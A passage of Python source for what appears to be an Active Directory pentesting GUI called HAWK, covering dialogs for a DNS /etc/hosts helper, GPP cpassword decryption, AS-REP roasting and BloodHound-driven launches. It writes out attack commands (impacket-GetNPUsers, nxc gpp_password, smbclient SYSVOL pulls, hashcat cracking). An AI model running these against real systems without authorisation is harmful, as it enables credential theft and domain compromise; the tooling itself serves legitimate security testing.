            # "blocked — command still has unfilled placeholder" log
            # AFTER they thought they'd kicked off the run.  Better:
            # block here, list every empty placeholder by name, and
            # tell the user the help text for each so they know what
            # to put in.  Stays in the dialog so the user can fix
            # without re-launching.
            empty_placeholders: list[str] = []
            for ph, var in placeholder_vars.items():
                if not (var.get() or "").strip():
                    empty_placeholders.append(ph)
            if empty_placeholders:
                miss = ", ".join(f"<{p}>" for p in empty_placeholders)
                self.app.terminal.write(
                    f"[!] {tool.name} cancelled — fill the missing "
                    f"placeholder(s) before running:  {miss}", "warn")
                # Surface the per-placeholder help text so the user
                # knows EXACTLY what to type in each field.
                for p in empty_placeholders:
                    helpt = _PLACEHOLDER_HELP.get(
                        p, f"Required value for <{p}>")
                    self.app.terminal.write(
                        f"      <{p}>:  {helpt}", "dim")
                return
            # Domain is required by most tools — only adidnsdump and
            # certain nxc modes are happy without it, but rather than
            # maintain a per-tool allowlist we just warn and let the
            # user decide.
            if not d and "{domain}" in tool.cmd_template:
                self.app.terminal.write(
                    f"[!] {tool.name} warning — domain is blank.  "
                    f"Most AD tools refuse to run without it.  "
                    f"Continuing anyway — the command may fail.", "warn")

            # DNS auto-trigger — most AD tools (bloodhound, certipy,
            # impacket-secretsdump, findDelegation, rbcd_attack,
            # addcomputer, adidnsdump) talk to the DC over Kerberos
            # on port 88.  Kerberos *requires* the DC's FQDN to be
            # resolvable by the attacker.  On lab/HTB/THM/external
            # networks that's almost never the case out of the box.
            # We probe DNS before launching — if the DC FQDN doesn't
            # resolve, hand the user the DNS HELPER dialog pre-filled
            # with the best guess; they approve, we add the entry to
            # /etc/hosts with the HAWK marker, then launch.  If they
            # skip, we launch anyway (Kerberos will fall back to NTLM
            # on most tools so the operation still works).
            #
            # IMPORTANT: destroy the outer auth dialog BEFORE showing
            # the DNS helper.  Tk doesn't support nested modal grabs
            # — the second dialog's grab_set() fails silently and the
            # user sees frozen buttons on both windows.  We keep the
            # command we just built, close the auth window, then hand
            # off the launch callback to the helper.
            def _continue_launch():
                self._run_raw(tool, cmd)

            needs_dns_helper = False
            if d:
                try:
                    from utils.hosts_helper import (suggest_dc_hostname,
                                                     resolvable)
                    guess = suggest_dc_hostname(d, target)
                    if guess and not resolvable(guess):
                        needs_dns_helper = True
                except Exception as e:
                    # Non-fatal — if DNS helper infrastructure broke,
                    # we still want the tool to run.  Log and proceed.
                    print(f"[HAWK] DNS auto-trigger error: {e}")

            # Close the outer auth dialog first (release the modal
            # grab) before either launching directly or opening the
            # DNS helper as the next modal.
            _safe_destroy(win)

            if needs_dns_helper:
                self.app.terminal.write(
                    f"  [!] DNS does NOT resolve the DC FQDN — "
                    f"Kerberos TGT will fail (auto-prompting "
                    f"DNS helper before launch).", "warn")
                self._show_ad_dns_helper_auto(
                    target, d,
                    on_continue=_continue_launch)
                return
            _continue_launch()

        row = _btn_row(win)
        _btn(row, "RUN", _run, primary=True, w=120)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _show_ad_dns_helper_auto(self, target_ip: str, domain: str,
                                   on_continue=None):
        """Pre-launch DNS helper — triggered automatically when the
        user is about to run an AD tool whose Kerberos auth needs
        a DC FQDN that currently doesn't resolve.

        Wraps _show_ad_dns_helper in a thin layer that (a) pre-
        compiles the FQDN field with the best guess, (b) shows a
        contextual message explaining WHY we're prompting, and (c)
        chains `on_continue` callback regardless of whether the user
        added the entry or skipped — in both cases the outer AD tool
        dialog needs to close and the tool launch needs to proceed.

        This is the "A + auto-trigger" flow the user originally asked
        for: /etc/hosts is modified IMMEDIATELY when they run a tool
        that needs it, with an explicit confirmation dialog instead
        of requiring a manual click on the DNS HELPER button."""
        from gui.dialogs import (_make_win, _title, _note_box,
                                  _btn_row, _btn, _safe_destroy)
        from utils.clipboard import add_context_menu
        from utils.hosts_helper import (suggest_dc_hostname,
                                         resolvable, list_hawk_entries,
                                         add_entries)

        guess = suggest_dc_hostname(domain, target_ip) or ""

        win = _make_win(self,
                        "DNS required — pre-launch fix",
                        720, 540)
        _title(win, "⚠  DNS FIX NEEDED BEFORE LAUNCH")

        _note_box(
            win,
            f"You're about to run an AD tool against:\n"
            f"    Target  : {target_ip}\n"
            f"    Domain  : {domain}\n\n"
            f"Kerberos authentication needs the DC's FQDN in DNS, "
            f"but your Kali can't resolve it:\n"
            f"    FQDN    : {guess}\n"
            f"    Resolves: NO ✗\n\n"
            f"If you proceed without fixing this, Kerberos will fail "
            f"with '[Errno -2] Name or service not known' and the "
            f"tool will fall back to NTLM — which works for some "
            f"tools but breaks certipy / certain impacket flows.",
            COLORS["text_yellow"])

        _note_box(
            win,
            "✓  Recommended: let HAWK add a temporary entry to "
            "/etc/hosts now.  It will be tagged with the HAWK marker "
            "('# HAWK-ad-dns') and removed AUTOMATICALLY when you:\n"
            "   • Close HAWK (X button / Alt-F4 / Ctrl-C)\n"
            "   • Click DELETE SESSION\n"
            "   • Click REMOVE ALL HAWK ENTRIES in any DNS helper\n"
            "Your /etc/hosts returns to exactly the pre-HAWK state.\n\n"
            "A pkexec (or sudo) password prompt appears once — HAWK "
            "does not run as root.",
            COLORS["border_green"])

        ctk.CTkLabel(win, text="DC FQDN to register:",
                     font=_f("md", True),
                     text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=24, pady=(8, 2))
        fqdn_var = ctk.StringVar(value=guess)
        fqdn_entry = ctk.CTkEntry(
            win, textvariable=fqdn_var,
            placeholder_text="e.g. dc01.corp.local  or  forest.htb",
            font=_f("md"), height=32,
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1,
            corner_radius=3)
        fqdn_entry.pack(fill="x", padx=24, pady=(0, 4))
        add_context_menu(fqdn_entry)
        ctk.CTkLabel(
            win,
            text=("Include the short name (space-separated) — "
                  "e.g. 'dc01.corp.local dc01' — for bare-name "
                  "LDAP binds."),
            font=_f("xs"), text_color=COLORS["text_dim"],
            anchor="w").pack(fill="x", padx=24, pady=(0, 8))

        status_var = ctk.StringVar(value="")
        status_lbl = ctk.CTkLabel(
            win, textvariable=status_var,
            font=_f("sm", True),
            text_color=COLORS["text_yellow"],
            wraplength=660, justify="left", anchor="w")
        status_lbl.pack(fill="x", padx=24, pady=(4, 4))

        def _add_and_launch():
            raw = fqdn_var.get().strip()
            if not raw:
                status_var.set("  ⚠  FQDN field is empty.")
                return
            names = [n for n in raw.split() if n]
            status_var.set("  …  pkexec / sudo prompt incoming…")
            status_lbl.configure(text_color=COLORS["text_cyan"])
            self.update_idletasks()
            ok, msg = add_entries([(target_ip, names)])
            if ok:
                self.app.terminal.write(
                    f"  [+] /etc/hosts: {target_ip} → {' '.join(names)}  "
                    f"(HAWK-tagged, cleanup on exit)", "success")
            else:
                self.app.terminal.write(
                    f"  [!] /etc/hosts update failed: {msg}.  "
                    f"Launching tool anyway; Kerberos will fall back "
                    f"to NTLM.", "warn")
            _safe_destroy(win)
            if on_continue:
                on_continue()

        def _skip_and_launch():
            self.app.terminal.write(
                "  [*] DNS fix skipped — Kerberos may fail, tool "
                "will fall back to NTLM.", "dim")
            _safe_destroy(win)
            if on_continue:
                on_continue()

        def _cancel_launch():
            self.app.terminal.write(
                f"  [*] Tool cancelled by user at DNS confirmation.",
                "dim")
            _safe_destroy(win)
            # on_continue NOT called — the tool does NOT launch.

        row = _btn_row(win)
        _btn(row, "ADD TO /etc/hosts & LAUNCH",
             _add_and_launch, primary=True, w=240)
        _btn(row, "SKIP DNS, LAUNCH ANYWAY",
             _skip_and_launch, warn=True, w=200)
        _btn(row, "CANCEL", _cancel_launch, w=100)

    def _show_ad_dns_helper(self, target_ip: str, domain: str):
        """DNS helper dialog — adds the DC's FQDN mapping to /etc/hosts
        so Kerberos TGT requests work.  Shown on-demand from the AD
        auth dialog via the DNS HELPER button.

        Works for every network scope the user might attack:
          • Lab VMs (HomeLab, GOAD) — box has no public DNS
          • HTB / THM — the VPN subnet has no DNS
          • External corp engagements — the DC's FQDN is typically
            NOT in public DNS (split-horizon)
        In all three cases Google DNS / 1.1.1.1 CAN'T help — the DC
        hostname is internal.  /etc/hosts is the only portable fix.

        Entries are tagged with a HAWK marker so DELETE SESSION can
        wipe them cleanly without touching unrelated lines."""
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        from utils.clipboard import add_context_menu
        from utils.hosts_helper import (suggest_dc_hostname,
                                         resolvable, list_hawk_entries,
                                         add_entries)

        # Best-effort DC FQDN guess: PTR lookup first, fallback to
        # domain-only when the user hasn't probed anything yet.
        guess = suggest_dc_hostname(domain, target_ip)
        if not guess:
            guess = ""

        win = _make_win(self, "DNS Helper — /etc/hosts", 700, 520)
        _title(win, "DNS HELPER  —  Make the DC FQDN resolvable")
        _sub(win,
             "Active Directory Kerberos auth needs the DC's FQDN in DNS "
             "or /etc/hosts.  We can add a temporary entry for you.",
             COLORS["text_dim"])

        _note_box(
            win,
            f"Target IP     : {target_ip}\n"
            f"AD domain     : {domain or '(none set)'}\n"
            f"Current DNS   : "
            f"{'resolves ✓' if resolvable(guess) else 'does NOT resolve ✗'}",
            COLORS["border_dim"])

        # ── Editable DC FQDN + extra aliases ─────────────────────────
        ctk.CTkLabel(win, text="DC FQDN to register:",
                     font=_f("md", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=24, pady=(8, 2))
        fqdn_var = ctk.StringVar(value=guess)
        fqdn_entry = ctk.CTkEntry(
            win, textvariable=fqdn_var,
            placeholder_text="e.g. dc01.corp.local  or  forest.htb",
            font=_f("md"), height=32,
            fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"], border_width=1,
            corner_radius=3)
        fqdn_entry.pack(fill="x", padx=24, pady=(0, 2))
        add_context_menu(fqdn_entry)
        ctk.CTkLabel(
            win,
            text=("Include the short name too if you know it (space-"
                  "separated) — e.g. 'dc01.corp.local dc01'"),
            font=_f("xs"), text_color=COLORS["text_dim"],
            anchor="w").pack(fill="x", padx=24, pady=(0, 8))

        # ── Existing HAWK entries ────────────────────────────────────
        ex = list_hawk_entries()
        if ex:
            ex_text = "Current HAWK-tagged entries:\n" + "\n".join(
                f"  {e['ip']}\t{' '.join(e['hostnames'])}" for e in ex)
            _note_box(win, ex_text, COLORS["text_cyan"])
        else:
            _note_box(
                win,
                "No HAWK entries currently in /etc/hosts.",
                COLORS["text_muted"])

        # ── Scope reminder for HTB / THM / external ──────────────────
        _note_box(
            win,
            "Works on any network scope:\n"
            "  • Lab VMs / home AD  — the DC's FQDN isn't in any DNS\n"
            "  • HTB / THM          — VPN subnet has no resolver\n"
            "  • External corp      — DC FQDN is behind split-horizon DNS\n"
            "Google DNS (8.8.8.8) / Cloudflare (1.1.1.1) can't help here "
            "— internal AD names never get published publicly.  "
            "/etc/hosts is the portable fix.",
            COLORS["text_muted"])

        # ── Lifecycle notice (prominent, green border) ───────────────
        # User-requested: make it crystal-clear that entries are
        # TEMPORARY and self-clean when HAWK closes — so the operator
        # doesn't worry about leaving orphaned records on their host.
        lifecycle_frame = ctk.CTkFrame(
            win, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_green"],
            border_width=2, corner_radius=4)
        lifecycle_frame.pack(fill="x", padx=24, pady=(8, 4))
        ctk.CTkLabel(
            lifecycle_frame,
            text="  ♻  LIFECYCLE — entries are TEMPORARY",
            font=_f("md", True),
            text_color=COLORS["text_green"],
            anchor="w",
        ).pack(fill="x", padx=10, pady=(6, 2))
        ctk.CTkLabel(
            lifecycle_frame,
            text=("HAWK tags every line it adds with "
                  "'# HAWK-ad-dns'.  These tagged lines are REMOVED "
                  "AUTOMATICALLY in any of these moments:\n"
                  "  1.  You close HAWK (X button / Alt-F4 / Quit)  "
                  "— /etc/hosts returns to exactly the state it was in "
                  "before you launched HAWK.\n"
                  "  2.  You click DELETE SESSION  — same cleanup, "
                  "triggered earlier.\n"
                  "  3.  You click REMOVE ALL HAWK ENTRIES below  — "
                  "manual cleanup at any time.\n\n"
                  "If HAWK is force-killed (crash / kill -9), the "
                  "exit handler doesn't run and tagged lines survive.  "
                  "On the next HAWK launch we detect stale tagged "
                  "lines and tell you in the terminal — one click on "
                  "REMOVE ALL HAWK ENTRIES wipes them.\n\n"
                  "You will be prompted for your password via pkexec "
                  "(or sudo-in-xterm) at both ADD and every cleanup "
                  "step.  No HAWK process runs as root."),
            font=_f("sm"),
            text_color=COLORS["text_dim"],
            wraplength=640, justify="left", anchor="w",
        ).pack(fill="x", padx=10, pady=(0, 8))

        status_var = ctk.StringVar(value="")
        status_lbl = ctk.CTkLabel(
            win, textvariable=status_var,
            font=_f("sm", True), text_color=COLORS["text_yellow"],
            wraplength=640, justify="left", anchor="w")
        status_lbl.pack(fill="x", padx=24, pady=(4, 4))

        def _do_add():
            raw = fqdn_var.get().strip()
            if not raw:
                status_var.set("  ⚠  FQDN field is empty.")
                return
            if not target_ip:
                status_var.set("  ⚠  No target IP to map.")
                return
            names = [n for n in raw.split() if n]
            status_var.set("  …  Requesting privilege escalation "
                           "(pkexec / sudo)…")
            status_lbl.configure(text_color=COLORS["text_cyan"])
            self.update_idletasks()
            ok, msg = add_entries([(target_ip, names)])
            if ok:
                status_var.set(f"  ✓  {msg}")
                status_lbl.configure(text_color=COLORS["text_green"])
                try:
                    self.app.terminal.write(
                        f"  [+] /etc/hosts: {target_ip} → "
                        f"{' '.join(names)}  (HAWK-tagged, "
                        f"cleanup on DELETE SESSION)", "success")
                except Exception:
                    pass
            else:
                status_var.set(f"  ✗  {msg}")
                status_lbl.configure(text_color=COLORS["text_red"])

        def _do_cleanup():
            from utils.hosts_helper import remove_hawk_entries_async
            status_var.set("  …  waiting for sudo/polkit")
            status_lbl.configure(text_color=COLORS["text_yellow"])

            def _on_done(ok, msg):
                def _apply():
                    if ok:
                        status_var.set(f"  ✓  {msg}")
                        status_lbl.configure(text_color=COLORS["text_green"])
                        try:
                            self.app.terminal.write(
                                f"  [*] /etc/hosts cleaned — {msg}", "dim")
                        except Exception:
                            pass
                    else:
                        status_var.set(f"  ✗  {msg}")
                        status_lbl.configure(text_color=COLORS["text_red"])
                try:
                    self.app.after(0, _apply)
                except Exception:
                    _apply()

            remove_hawk_entries_async(_on_done)

        row = _btn_row(win)
        _btn(row, "ADD TO /etc/hosts", _do_add, primary=True, w=200)
        _btn(row, "REMOVE ALL HAWK ENTRIES", _do_cleanup, warn=True, w=240)
        _btn(row, "CLOSE", lambda: _safe_destroy(win))

    def _route_gpp_decrypt(self, tool):
        """GPP-Decrypt dialog — the tool's cmd_template is literally
        `gpp-decrypt {password}` where {password} is the base64-encoded
        cpassword string extracted from SYSVOL Groups.xml, Services.xml,
        ScheduledTasks.xml, Printers.xml, DataSources.xml, or Drives.xml.

        This is NOT an AD credential — it's a GPP-encrypted local-admin
        password.  Microsoft published the AES key in MSDN in 2012
        (KB2962486), so any cpassword blob is instantly recoverable.

        We give the user a big textbox + a quick reminder of where to
        find these files on an accessible SYSVOL share."""
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        from utils.clipboard import add_context_menu

        win = _make_win(self, "GPP-Decrypt", 620, 500)
        _title(win, "GPP-DECRYPT  —  Groups.xml cpassword")
        _sub(win, "Paste a base64 cpassword blob to decrypt it locally.",
             COLORS["text_dim"])

        _note_box(win,
                  "Where to find cpassword blobs on SYSVOL:\n"
                  "  \\\\<DC>\\SYSVOL\\<domain>\\Policies\\{GUID}\\"
                  "[Machine|User]\\Preferences\\"
                  "{Groups,Services,ScheduledTasks,Printers,DataSources,"
                  "Drives}\\*.xml\n\n"
                  "Grab it (a DC refuses null sessions — use a domain user):\n"
                  "  nxc smb <DC> -u <user> -p <pass> -M gpp_password\n"
                  "  smbclient //<DC>/SYSVOL -U '<user>%<pass>' -c "
                  "'recurse ON; prompt OFF; mget *'\n"
                  "    then:  grep -rho 'cpassword=\"[^\"]*\"' .",
                  COLORS["border_dim"])

        ctk.CTkLabel(win, text="cpassword (base64):",
                     font=_f("md", True),
                     text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=24, pady=(4, 2))

        # Multi-line textbox — blobs are long and often wrap; single
        # CTkEntry would be a usability pain.
        box = ctk.CTkTextbox(
            win, height=80, font=_f("md"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"],
            border_width=1, corner_radius=3, wrap="word")
        box.pack(fill="x", padx=24, pady=(0, 8))
        add_context_menu(box)

        ctk.CTkLabel(
            win,
            text=("Example:  "
                  "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"),
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(fill="x", padx=24, pady=(0, 4))

        # Optional account name — it lives in the source Groups.xml, not in
        # gpp-decrypt's output, so the operator supplies it here to label
        # the recovered credential (the parser stores it on the cred).
        ctk.CTkLabel(win, text="Account name (optional):",
                     font=_f("md", True),
                     text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=24, pady=(6, 2))
        uname_entry = ctk.CTkEntry(
            win, font=_f("md"), height=30,
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"],
            border_width=1, corner_radius=3,
            placeholder_text=("the userName from the source Groups.xml — "
                              "labels the saved credential"))
        uname_entry.pack(fill="x", padx=24, pady=(0, 8))
        add_context_menu(uname_entry)

        def _run():
            blob = box.get("1.0", "end").strip()
            if not blob:
                self.app.terminal.write(
                    "[!] GPP-DECRYPT cancelled — cpassword field is empty.",
                    "warn")
                return
            # Strip whitespace inside the blob (users sometimes paste
            # with embedded newlines from XML files).
            blob = "".join(blob.split())
            # Stash the optional account name for the parser to label the
            # recovered credential (read BEFORE the window is destroyed).
            self._gpp_username = uname_entry.get().strip()
            _safe_destroy(win)
            # Shell-escape and run.  gpp-decrypt writes the decrypted
            # value to stdout; ToolRunner captures it so we see it in
            # the HAWK terminal.
            cmd = f"gpp-decrypt {_shq(blob)}"
            self._run_raw(tool, cmd)

        row = _btn_row(win)
        _btn(row, "DECRYPT", _run, primary=True, w=140)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _route_getnpusers(self, tool):
        """Impacket GetNPUsers with user wordlist picker + domain."""
        target = self._get_target()
        if not target:
            return

        # Try to pre-fill domain from session
        default_domain = ""
        detected_os = ""
        try:
            sess = self.app.session_manager.current
            if sess:
                if getattr(sess, "target_domain", ""):
                    default_domain = sess.target_domain
                detected_os = getattr(sess, "detected_os", "") or ""
        except Exception:
            pass

        wl_options = _get_user_wordlists(detected_os)
        if not wl_options:
            wl_options = [("xato-net-10-million-usernames",
                           "/usr/share/seclists/Usernames/"
                           "xato-net-10-million-usernames.txt")]

        # Look up a usable domain cred (non-anon, has a cleartext
        # password) so AUTHENTICATED AS-REP roast can be the default when
        # we already have a foothold: with creds GetNPUsers asks the DC
        # over LDAP for every DONT_REQ_PREAUTH account and roasts them in
        # one shot — no username wordlist, no thousands of AS-REQ misses,
        # and it finds custom-named accounts a generic list never would.
        du = dp = ""
        try:
            _sess = self.app.session_manager.current
            for c in (_sess.get_credentials() if _sess else []):
                un = (c.username or "").strip()
                if (un.lower() in ("anonymous", "guest", "")
                        or not (c.password or "")):
                    continue
                du, dp = un, (c.password or "")
                if getattr(c, "verified", False):
                    break   # prefer a verified login if we find one
        except Exception:
            pass

        def _add_domain_widget(win):
            from gui.dialogs import _note_box
            _note_box(win,
                      "AS-REP Roasting: finds users without Kerberos\n"
                      "pre-authentication.  Authenticated (with creds) asks\n"
                      "the DC directly via LDAP — instant, no wordlist.\n"
                      "Without creds, falls back to guessing usernames.",
                      COLORS["border_dim"])
            domain_var = ctk.StringVar(value=default_domain or "DOMAIN.LOCAL")
            auth_var = ctk.BooleanVar(value=bool(du and dp))
            user_var = ctk.StringVar(value=du)
            pass_var = ctk.StringVar(value=dp)

            def _row(label, var, show=""):
                f = ctk.CTkFrame(win, fg_color="transparent")
                ctk.CTkLabel(f, text=label, font=_f("sm", True),
                             text_color=COLORS["text_bright"], anchor="w",
                             width=70).pack(side="left")
                en = ctk.CTkEntry(
                    f, textvariable=var, show=show,
                    font=_f("md"), height=30,
                    fg_color=COLORS["bg_card"],
                    text_color=COLORS["text_bright"],
                    border_color=COLORS["border_green"], border_width=1,
                    corner_radius=3)
                en.pack(side="left", fill="x", expand=True, padx=(4, 0))
                add_context_menu(en)
                return f

            df = _row("Domain:", domain_var)
            df.pack(fill="x", padx=24, pady=(4, 2))

            cf = ctk.CTkFrame(win, fg_color="transparent")
            cf.pack(fill="x", padx=24, pady=(2, 2))
            uf = _row("User:", user_var)
            pf = _row("Pass:", pass_var, show="*")

            def _sync_auth(*_):
                if auth_var.get():
                    uf.pack(fill="x", padx=24, pady=(2, 0))
                    pf.pack(fill="x", padx=24, pady=(2, 6))
                else:
                    uf.pack_forget()
                    pf.pack_forget()

            ctk.CTkCheckBox(
                cf,
                text="Authenticated (use stored creds — LDAP, no wordlist)",
                variable=auth_var, command=_sync_auth,
                font=_f("sm"), text_color=COLORS["text_bright"],
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_green"],
                checkmark_color=COLORS["text_green"]).pack(side="left")
            _sync_auth()
            return {"domain_var": domain_var, "auth_var": auth_var,
                    "user_var": user_var, "pass_var": pass_var}

        def _on_run(wl_path, _ext, _threads, extra):
            domain_var = extra.get("domain_var")
            domain = domain_var.get().strip() if domain_var else "DOMAIN.LOCAL"

            # ── Authenticated mode ──────────────────────────────────────
            # With a domain cred, GetNPUsers binds to the DC and LDAP-
            # enumerates every DONT_REQ_PREAUTH account, then roasts each
            # one — the wordlist (and its 10M-request DC hammering) is
            # skipped entirely.  This is the right flow once you have any
            # foothold, and the only way to reach custom-named accounts a
            # generic username list would miss.
            auth_var = extra.get("auth_var")
            if auth_var is not None and auth_var.get():
                u = (extra.get("user_var").get() or "").strip()
                p = extra.get("pass_var").get() or ""
                if not (domain and u and p):
                    self.app.terminal.write(
                        "  [!] Authenticated AS-REP needs domain + username "
                        "+ password.", "warn")
                    return
                import os as _os
                from utils.config import OUTPUTS_DIR as _OUT
                outp = _os.path.join(_OUT, f"asrep-{target}.txt")
                self._run_raw(tool, (
                    f"impacket-GetNPUsers {domain}/{u}:{_shq(p)} "
                    f"-dc-ip {target} -request -format hashcat "
                    f"-outputfile {_shq(outp)}"))
                return

            # Line-count guard — AS-REP roast on a 10M wordlist is
            # ~24 hours of DC hammering (~100 AS-REQ/s).  Anything
            # over 100k lines triggers a blocking warning so the user
            # can re-think.  Sub-100k runs start silently.
            lines = 0
            try:
                with open(wl_path, "rb") as f:
                    lines = sum(1 for _ in f)
            except Exception:
                pass

            def _actually_run():
                # _run_raw owns the "section + $ cmd" banner — don't
                # duplicate it here or the terminal shows the same
                # line twice.
                cmd = (f"impacket-GetNPUsers -dc-ip {target} -no-pass "
                       f"-usersfile {_shq(wl_path)} {domain}/")
                self._run_raw(tool, cmd)

            if lines > 100_000:
                from gui.dialogs import (_make_win, _title, _note_box,
                                         _btn_row, _btn, _safe_destroy)
                # Estimate — DC responds at 80-150 req/s; use 100 for
                # the rough math shown to the user.
                est_minutes = lines // 100 // 60
                warn = _make_win(self, "Huge wordlist — really?",
                                 640, 480)
                _title(warn, "⚠  Wordlist looks oversized")
                _note_box(
                    warn,
                    f"You picked a wordlist with {lines:,} lines.\n"
                    f"At ~100 AS-REQ / second (typical DC response rate) "
                    f"this run will take about {est_minutes:,} minutes "
                    f"— roughly {est_minutes/60:.1f} hours.\n\n"
                    f"Most of those requests will return "
                    f"KDC_ERR_C_PRINCIPAL_UNKNOWN (the user doesn't "
                    f"exist) — you'd be spending hours to flush 9.9 M "
                    f"misses for maybe 5-50 real hits.",
                    COLORS["text_yellow"])
                _note_box(
                    warn,
                    "Recommended pentester flow on AD engagements:\n"
                    "  1.  Run KERBRUTE Users (Enumeration phase) with\n"
                    "      a MEDIUM list (Names/names.txt ~10 k — 2 min).\n"
                    "      kerbrute enumerates users with zero auth cost\n"
                    "      and gives you a short list of VALID usernames.\n"
                    "  2.  Save those valid usernames to a file.\n"
                    "  3.  Re-run AS-REP ROAST with THAT file — takes\n"
                    "      seconds, zero noise, only real targets.\n\n"
                    "Alternative quick test:  use a 'top-20' or Names.txt\n"
                    "list from the dropdown — gets you the first-wave\n"
                    "results in ~2 minutes.",
                    COLORS["border_dim"])
                row = _btn_row(warn)
                _btn(row, "CANCEL (recommended)",
                     lambda: _safe_destroy(warn), primary=True, w=200)
                _btn(row, "RUN ANYWAY",
                     lambda: [_safe_destroy(warn), _actually_run()],
                     warn=True, w=140)
                return

            _actually_run()

        self._show_wordlist_picker(
            tool, wl_options,
            title="IMPACKET GetNPUsers  —  AS-REP Roasting",
            subtitle=f"DC: {target}",
            callback=_on_run,
            show_extensions=False,
            show_threads=False,
            extra_widgets_fn=_add_domain_widget)

    def _route_asrep_single_user(self, tool, username, domain=""):
        """Minimal AS-REP roast dialog when the user already picked a
        specific target (e.g. clicked an AS-REP-roastable node in the
        BloodHound attack graph).

        Skips the wordlist picker — there's nothing to enumerate, we
        already know the one user to hit.  Shows target/domain/username
        pre-filled and editable, then fires:

            impacket-GetNPUsers DOMAIN/USER -no-pass -request
                -format hashcat -dc-ip <target>
                -outputfile <HAWK>/outputs/asrep-<target>.txt

        The `-request` flag asks the KDC for the AS-REP ticket (vs.
        just enumerating which users have the flag set — that's the
        wordlist mode).  One AS-REQ packet, one hash, seconds.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        target = self._get_target()
        if not target:
            return

        # Pre-fill domain from session if not passed in.
        if not domain:
            try:
                sess = self.app.session_manager.current
                if sess and getattr(sess, "target_domain", ""):
                    domain = sess.target_domain
            except Exception:
                pass
        domain = domain or "DOMAIN.LOCAL"

        win = _make_win(self, f"AS-REP Roast — {username}", 620, 440)
        _title(win, f"AS-REP ROAST — {username}")
        _sub(win, f"DC: {target}", COLORS["text_dim"])

        _note_box(
            win,
            f"Pre-filled from the BloodHound attack graph.  {username} "
            f"has 'Do not require Kerberos pre-authentication' set — "
            f"so we can request an AS-REP ticket and crack its "
            f"RC4 hash offline (hashcat -m 18200).  No password needed.",
            COLORS["text_cyan"])

        user_var   = ctk.StringVar(value=username)
        domain_var = ctk.StringVar(value=domain)

        def _row(label, var):
            f = ctk.CTkFrame(win, fg_color="transparent")
            f.pack(fill="x", padx=24, pady=(4, 0))
            ctk.CTkLabel(f, text=label, width=110, anchor="w",
                         font=_f("sm", True),
                         text_color=COLORS["text_bright"]).pack(side="left")
            e = ctk.CTkEntry(
                f, textvariable=var, font=_f("md"), height=30,
                fg_color=COLORS["bg_card"],
                text_color=COLORS["text_bright"],
                border_color=COLORS["border_green"],
                border_width=1, corner_radius=3)
            e.pack(side="left", fill="x", expand=True)
            add_context_menu(e)

        _row("Username", user_var)
        _row("Domain",   domain_var)

        from utils.config import OUTPUTS_DIR as _OUTDIR
        _outpath = _OUTDIR + f"/asrep-{target}.txt"
        _note_box(
            win,
            f"Output file:  {_outpath}\n"
            f"Crack with:   hashcat -m 18200 {_outpath} "
            f"/usr/share/wordlists/rockyou.txt",
            COLORS["border_dim"])

        def _go():
            u = (user_var.get() or "").strip()
            d = (domain_var.get() or "").strip() or "DOMAIN.LOCAL"
            if not u:
                return
            _safe_destroy(win)
            cmd = (f"impacket-GetNPUsers {d}/{u} -no-pass -request "
                   f"-format hashcat -dc-ip {target} "
                   f"-outputfile {_outpath}")
            self.app.terminal.section(
                f"AS-REP ROAST — {u}@{d}")
            self.app.terminal.write(f"  $ {cmd}", "cmd")
            self._run_raw(tool, cmd)

        row = _btn_row(win)
        _btn(row, "RUN", _go, primary=True, w=140)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=140)

    def launch_tool_prefilled(self, tool_id, prefill):
        """Entry point called by the BloodHound attack-graph side panel
        when the user clicks a "RUN IN <tool>" button on a node.

        Resolves the tool id to the Tool instance and dispatches to the
        right routing method with the prefill dict.  Silent no-op if
        the tool id is unknown or the tool isn't available on this
        system (we prefer opening the normal CardWidget card for
        install instructions than popping an error).

        prefill is a plain dict — see _route_ad_template docstring for
        the accepted keys.  Caller sets prefill["_origin"] to a short
        label (e.g. "BloodHound attack graph") that the dialog shows
        as a cyan banner so the user knows why fields are pre-filled.
        """
        if not tool_id:
            return
        # Find the Tool across every phase card.  The KillChainPanel
        # exposes a {phase_id: KillChainCard} dict via `.cards`; each
        # card's `module.get_tools()` returns the Tool list for that
        # phase.  We scan every card because the graph button might
        # target a tool (e.g. getuserspns) that lives in AD_PENTESTING
        # while the parser lives on the same card — staying agnostic
        # means this works even if the caller isn't the tool's owner.
        tool = None
        try:
            cards = self.app.kill_chain_panel.cards
            for card in cards.values():
                for t in card.module.get_tools() or []:
                    if getattr(t, "id", "") == tool_id:
                        tool = t
                        break
                if tool:
                    break
        except Exception:
            tool = None
        # Fallback: scan THIS card's own tools (defensive — in practice
        # the above loop covers everything the app has loaded).
        if tool is None:
            try:
                for t in self.module.get_tools() or []:
                    if getattr(t, "id", "") == tool_id:
                        tool = t
                        break
            except Exception:
                pass
        if tool is None:
            self.app.terminal.write(
                f"  [hawk] graph RUN IN: unknown tool id "
                f"'{tool_id}' — cannot launch.", "error")
            return

        # Dispatch.
        pf = dict(prefill or {})
        pf.setdefault("_origin", "BloodHound attack graph")

        # Kerberoast: prefill uses `extras` with -request-user so the
        # existing _route_ad_template dialog opens targeting the user.
        if tool_id == "getuserspns":
            self._route_ad_template(tool, prefill=pf)
            return

        # AS-REP: custom minimal dialog since _route_getnpusers uses a
